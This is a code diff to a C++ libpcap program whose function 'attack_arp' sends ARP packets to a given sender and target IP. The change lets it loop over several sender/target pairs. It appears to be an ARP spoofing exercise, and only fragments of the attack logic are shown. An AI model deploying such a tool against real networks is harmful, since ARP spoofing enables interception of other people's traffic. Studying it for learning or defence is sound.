@@ -110,7 +110,7 @@ ArpPacket get_packet(pcap_t* pcap, std::string mac_){
 
 
 
-void attack_arp(int couple, char* dev, char* sender_ip, char* target_ip, pcap_t* pcap){
+void attack_arp(char* dev, char* sender_ip, char* target_ip, pcap_t* pcap){
 	//Send Arp Request
 	std::string d_mac_  = "ff:ff:ff:ff:ff:ff";
 	std::string s_mac_ = get_my_mac(dev);
@@ -144,19 +144,19 @@ int main(int argc, char* argv[]) {
 	}
 
 
-
-
-
-
 	char* dev = argv[1];
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+	// pcap_t* pcap = pcap_open_live(dev, 0, 0, 0, errbuf);
 	if (pcap == nullptr) {
 		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
 		return EXIT_FAILURE;
 	}
 
-	attack_arp(argc -2 ,dev ,argv[2] , argv[3],  pcap);
+	for(int i=2;i<argc; i+=2){
+		attack_arp(dev ,argv[i] , argv[i+1],  pcap);
+	}
+
 
 	pcap_close(pcap);
 }
